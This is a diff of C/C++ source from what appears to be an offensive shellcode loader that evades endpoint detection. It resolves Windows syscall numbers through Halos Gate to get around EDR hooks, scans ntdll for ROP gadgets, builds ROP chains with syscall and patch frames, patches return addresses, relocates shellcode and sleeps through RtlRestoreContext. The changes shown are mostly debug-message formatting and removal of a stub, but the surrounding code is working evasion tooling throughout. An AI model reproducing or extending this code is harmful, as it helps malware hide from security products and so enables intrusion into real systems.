@@ -166,14 +166,14 @@ static bool declfn dynamic_ssn_syscall_retrieval(	uint32_t FunctionHash,
 				*SyscallServiceNumber	= *(PDWORD)((PBYTE)AddressOfName + 4);
 				*SyscallAddressJmp		=  (PDWORD)((PBYTE)AddressOfName + 18);
 				#ifdef DEBUG
-				DBG("[+] Function is not hooked and the SSN is 0x%lx\n", *SyscallServiceNumber);
-				DBG("[+] Found location of syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
+				DBG("   \\__[+] Function is not hooked and the SSN is 0x%lx\n", *SyscallServiceNumber);
+				DBG("   |__[+] Found location of syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
 				#endif
 				return true;
 			}
 			else{
 				#ifdef DEBUG
-				DBG("[!] Function is hooked!\n");
+				DBG("   \\__[!] Function is hooked!\n");
 				#endif
 				found = true;
 				break;
@@ -196,8 +196,8 @@ static bool declfn dynamic_ssn_syscall_retrieval(	uint32_t FunctionHash,
 			*SyscallServiceNumber	= (*(PDWORD)(AddressUp + 4)) + i;
 			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
 			#ifdef DEBUG
-			DBG("[+] Found SSN 0x%lx via Halos Gate with negative delta of %ld\n", *SyscallServiceNumber, i);
-			DBG("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
+			DBG("   \\__[+] Found SSN 0x%lx via Halos Gate with negative delta of %ld\n", *SyscallServiceNumber, i);
+			DBG("   |__[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
 			#endif
 			return true;
 		}
@@ -209,14 +209,14 @@ static bool declfn dynamic_ssn_syscall_retrieval(	uint32_t FunctionHash,
 			*SyscallServiceNumber	= (*(PDWORD)(AddressDown + 4)) - i;
 			*SyscallAddressJmp		= (PDWORD)(AddressUp + 18);
 			#ifdef DEBUG
-			DBG("[+] Found SSN 0x%lx via Halos Gate with positive delta of %ld\n", *SyscallServiceNumber, i);
-			DBG("[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
+			DBG("   \\__[+] Found SSN 0x%lx via Halos Gate with positive delta of %ld\n", *SyscallServiceNumber, i);
+			DBG("   |__[+] Found location of unhooked syscall opcode 0x%p\n", (void*)(*SyscallAddressJmp));
 			#endif
 			return true;
 		}
 	}
 	#ifdef DEBUG
-	DBG("[!] Every function is hooked!\n");
+	DBG("   \\__[!] Every function is hooked!\n");
 	#endif
 	*SyscallServiceNumber	= DWORD_MAX;
 	*SyscallAddressJmp		= NULL;
@@ -264,6 +264,14 @@ static PDWORD declfn gadget_scan(const char* pattern, size_t length, PBYTE PeBas
 }
 
 static int32_t declfn calculate_stack_delta(int32_t fFrames, ARG_IDX ArgIdx){
+	/*	when it comes to the delta we calulate with this function
+	 *	this function's only purpose is to calculate delta
+	 *	to write to a remote frame during ROP chain execution
+	 *	WITHIN a patch frame
+	 *	then to get the address of the argument it should be
+	 *	SavedOffset += calculate_stack_delta(DELTA, ARG);
+	 *	and this offset can be resolved in the patch frame args	
+	 */
 	return	((PATCHER_FRAME_SIZE) +
 			 (fFrames * FNCTION_FRAME_SIZE) + 
 			 ArgIdx
@@ -278,45 +286,24 @@ static void declfn patch_return_address(PVOID* ReturnAddress, PVOID OldBase, PVO
 	return;
 }
 
-
-static void declfn patch_stack(PCONTEXT ctx){
-	PVOID    Retaddr   = __builtin_return_address( 0 );
-	#ifdef DEBUG
-	auto msvcrt = resolve::module(expr::hash_string<wchar_t>( L"msvcrt.dll" ));
-	if( ! (msvcrt) ){
-		return;
-	}
-	decltype( printf ) * DBG = RESOLVE_API(msvcrt, printf);
-	if( ! (DBG) ){
-		return;
-	}
-	#endif
-	
-	#ifdef DEBUG
-	DBG("[*] Attempting to patch expired return addresses\n");
-	#endif
-	
-	return;
-}
-
-static inline BYTE declfn insert_syscall_frame(uint32_t StubHash, 
-										PBYTE BaseNtDll,
-										GADGETS GadgetArray,
-										DWORD64* ROPChain, 
-										size_t* Offset,
-										uint32_t SyscallHash,
-										DWORD64 arg1	= 0,
-										DWORD64 arg2	= 0,
-										DWORD64 arg3	= 0,
-										DWORD64 arg4	= 0,
-										DWORD64 arg5	= 0,
-										DWORD64 arg6	= 0,
-										DWORD64 arg7	= 0,
-										DWORD64 arg8	= 0,
-										DWORD64 arg9	= 0,
-										DWORD64 arg10	= 0,
-										DWORD64 arg11	= 0,
-										DWORD64 arg12	= 0
+static inline BYTE declfn insert_syscall_frame(	uint32_t StubHash, 
+												PBYTE BaseNtDll,
+												GADGETS GadgetArray,
+												DWORD64* ROPChain, 
+												size_t* Offset,
+												uint32_t SyscallHash,
+												DWORD64 arg1	= 0,
+												DWORD64 arg2	= 0,
+												DWORD64 arg3	= 0,
+												DWORD64 arg4	= 0,
+												DWORD64 arg5	= 0,
+												DWORD64 arg6	= 0,
+												DWORD64 arg7	= 0,
+												DWORD64 arg8	= 0,
+												DWORD64 arg9	= 0,
+												DWORD64 arg10	= 0,
+												DWORD64 arg11	= 0,
+												DWORD64 arg12	= 0
 ){
 	PIMAGE_DOS_HEADER DosHeader				= (PIMAGE_DOS_HEADER)(BaseNtDll);
 	PIMAGE_NT_HEADERS NtHeader				= (PIMAGE_NT_HEADERS)((PBYTE)DosHeader + DosHeader->e_lfanew);	// You make me mad
@@ -416,16 +403,7 @@ static inline void declfn insert_patch_frame(	GADGETS gadgetArray,
 										DWORD64 Old_Base_Delta,
 										DWORD64 New_Base_Delta
 ){
-	/*
-		when it comes to the delta we calulate with this function
-		this function's only purpose is to calculate delta
-		to write to a remote frame during ROP chain execution
-		WITHIN a patch frame
-		then to get the address of the argument it should be
-		SavedOffset += calculate_stack_delta(DELTA, ARG);
-		and this offset can be resolved in the patch frame args
-		
-	*/
+
 	ROPChain[(*Offset)++] = gadgetArray.pop_r8;
 	ROPChain[(*Offset)++] = DestAddy;
 	ROPChain[(*Offset)++] = gadgetArray.pop_rax;
@@ -554,8 +532,9 @@ BYTE declfn instance::Blossom(DWORD Delay){
 			patch_return_address((PVOID*)(base.callstack[i]), old, (PVOID)base.address);
 		}
 		#ifdef DEBUG
-			msvcrt.printf("[+] patched return address %p\n", *(PVOID*)(base.callstack[base.frame_idx - 1]));
-			msvcrt.printf("[+] new shellcode location @ %p\n", (PVOID)base.address);
+		msvcrt.printf("[+] new return address %p\n", *(PVOID*)(base.callstack[base.frame_idx - 1]));
+		msvcrt.printf("[!] original Shellcode location @ %p\n", old);
+		msvcrt.printf("[+] new shellcode location @ %p\n", (PVOID)base.address);
 		#endif
 		base.frame_idx--;
 		return THERE_IS_NO_ERROR;
@@ -726,7 +705,6 @@ BYTE declfn instance::Blossom(DWORD Delay){
 	RopCTX.Rsp	= (DWORD64)(ROP_Structure.RopChain);
 	ROP_Structure.triggered	= true;
 	#ifdef DEBUG
-		msvcrt.printf("[!] Current Shellcode location @ %p\n", (void*)base.address);
 		msvcrt.printf("[*] Going to sleep!!\n"); 
 	#endif
 	kernel32.RtlRestoreContext(&RopCTX, NULL);
